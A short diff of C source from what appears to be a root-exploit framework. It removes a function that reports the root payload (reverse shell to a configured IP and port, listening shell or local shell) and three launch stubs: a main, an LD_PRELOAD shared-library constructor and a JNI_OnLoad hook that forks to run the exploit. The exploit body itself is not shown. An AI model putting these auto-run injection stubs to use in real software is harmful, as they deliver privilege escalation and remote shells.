@@ -128,48 +128,4 @@ static void root_payload() {
 #endif
 }
 
-static void root_payload_info() {
-#ifdef REVERSE_SHELL
-  printf("root payload: reverse shell to (%s:%d)\n", ROOT_PAYLOAD_IP, ROOT_PAYLOAD_PORT);
-#elif LISTENING_SHELL
-  printf("root payload: listening shell on port %d\n", ROOT_PAYLOAD_PORT);
-#else
-  puts("root payload: local shell");
-#endif
-}
-
-#ifdef EXPLOIT_STATIC
-int main() {
-  puts("Starting static exploit...");
-  root_payload_info();
-  EXPLOIT_MAIN
-}
-#endif
-
-#ifdef EXPLOIT_SHARED
-static void init() __attribute__((constructor));
-void init() {
-  unsetenv("LD_PRELOAD");
-  puts("Starting shared exploit...");
-  root_payload_info();
-  EXPLOIT_MAIN
-}
-#endif
-
-#ifdef EXPLOIT_JNI
-#include <jni.h>
-JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
-  puts("Starting JNI exploit...");
-  root_payload_info();
-
-  if (fork() == 0) {
-    EXPLOIT_MAIN
-  } else {
-    for (;;) {
-      sleep(20);
-    }
-  }
-}
-#endif
-
 #endif
